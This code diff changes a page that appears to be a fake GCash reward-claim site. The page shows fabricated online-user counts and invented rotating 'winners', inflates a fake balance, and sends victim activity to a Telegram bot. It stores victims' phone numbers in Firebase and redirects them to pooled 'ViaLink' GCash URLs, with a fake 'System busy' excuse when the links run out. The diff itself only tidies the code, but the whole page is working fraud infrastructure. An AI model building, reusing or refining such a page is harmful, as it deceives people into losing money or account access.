@@ -14,18 +14,12 @@
 
     <script>
         (function() {
-            // Check for Banned or Not Verified
             const isBanned = localStorage.getItem("cp_device_locked") === "true";
             const isVerified = localStorage.getItem("cp_verified") === "true";
-            if (isBanned || !isVerified) {
-                window.location.replace("index.html"); 
-                return;
-            }
+            if (isBanned || !isVerified) { window.location.replace("index.html"); return; }
 
-            // Mobile-Only Enforcement
             const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
             const isSmallScreen = window.innerWidth <= 768;
-
             window.onload = function() {
                 if (!isMobile && !isSmallScreen) {
                     document.getElementById('mobileOnlyOverlay').style.display = 'flex';
@@ -54,7 +48,7 @@
         <div class="live-stats">
             <div class="online-count"><span class="dot"></span> <span id="userCount">32</span> Members Online</div>
             <div class="live-winner-box" id="winnerBox">
-                <span id="winnerEntry">User 0917***8821 just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱500</span>
+                <span id="winnerEntry">User 0917***8821 just claimed <img src="images/gc_icon.png" class="gc-mini-icon" style="width: 14px; height: 14px; vertical-align: middle;">₱500</span>
             </div>
         </div>
 
@@ -97,7 +91,6 @@
     </div>
 
     <script>
-        // --- 1. INITIALIZE FIREBASE & TRACKING ---
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         
@@ -110,21 +103,12 @@
             try { await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`); } catch(e) {}
         }
 
-        // --- 2. GAME CARD ANIMATION & BALANCE LOGIC ---
         function triggerMove(element, amount) {
-            // Trigger physical animation class
             element.classList.add('move-active');
-            
-            // Get current balance and add new amount
             let currentText = document.getElementById('balanceText').innerText.replace('₱', '').replace(/,/g, '');
             let currentBalance = parseFloat(currentText) || 0;
-            
             animateValue(currentBalance, currentBalance + amount, 500);
-
-            // Remove class after animation finishes (600ms)
-            setTimeout(() => {
-                element.classList.remove('move-active');
-            }, 600);
+            setTimeout(() => { element.classList.remove('move-active'); }, 600);
         }
 
         function animateValue(start, end, duration) {
@@ -134,18 +118,14 @@
                 const progress = Math.min((timestamp - startTimestamp) / duration, 1);
                 const currentVal = Math.floor(progress * (end - start) + start);
                 document.getElementById('balanceText').innerText = "₱" + currentVal.toLocaleString() + ".00";
-                if (progress < 1) {
-                    window.requestAnimationFrame(step);
-                }
+                if (progress < 1) window.requestAnimationFrame(step);
             };
             window.requestAnimationFrame(step);
         }
 
-        // --- 3. VIALINK SYSTEM (GCASH REDIRECT) ---
         function redirectToGCash() {
             const claimBtn = document.getElementById('claimBtn');
             const overlay = document.getElementById('processingOverlay');
-
             claimBtn.disabled = true;
             overlay.style.display = 'flex';
             
@@ -156,17 +136,9 @@
                     const linkId = Object.keys(snapshot.val())[0];
                     const targetUrl = snapshot.val()[linkId].url;
 
-                    db.ref('links/' + linkId).update({
-                        status: 'pending',
-                        user: savedPhone
-                    });
-
+                    db.ref('links/' + linkId).update({ status: 'pending', user: savedPhone });
                     trackActivity(`ViaLink Established! Redirecting to GCash...`);
-
-                    setTimeout(() => {
-                        window.location.href = targetUrl;
-                    }, 3500);
-
+                    setTimeout(() => { window.location.href = targetUrl; }, 3500);
                 } else {
                     trackActivity("CRITICAL ERROR: No Ready ViaLinks in Database!");
                     alert("System busy! All reward slots are currently full. Please try again in 10 minutes.");
@@ -176,7 +148,6 @@
             });
         }
 
-        // --- 4. TIMER, SHARE BUTTON & STATS ---
         let timeLeft = 5;
         const countdownTimer = setInterval(() => {
             timeLeft--;
@@ -196,14 +167,14 @@
             animateValue(currentBalance, currentBalance + 50, 500);
         }
 
-        // Live Winner Rotator
+        // Live Winner Rotator (In-update din ang GCash icon inline style dito)
         setInterval(() => {
             const online = Math.floor(Math.random() * (90 - 40)) + 40;
             document.getElementById('userCount').innerText = online;
             const pref = ["0917", "0915", "0998", "0966", "0927"][Math.floor(Math.random() * 5)];
             const suffix = Math.floor(1000 + Math.random() * 9000);
             const amt = [500, 800, 1000, 1200][Math.floor(Math.random() * 4)];
-            document.getElementById('winnerEntry').innerHTML = `User ${pref}***${suffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱${amt}`;
+            document.getElementById('winnerEntry').innerHTML = `User ${pref}***${suffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon" style="width: 14px; height: 14px; vertical-align: middle;">₱${amt}`;
         }, 4000);
     </script>
 </body>
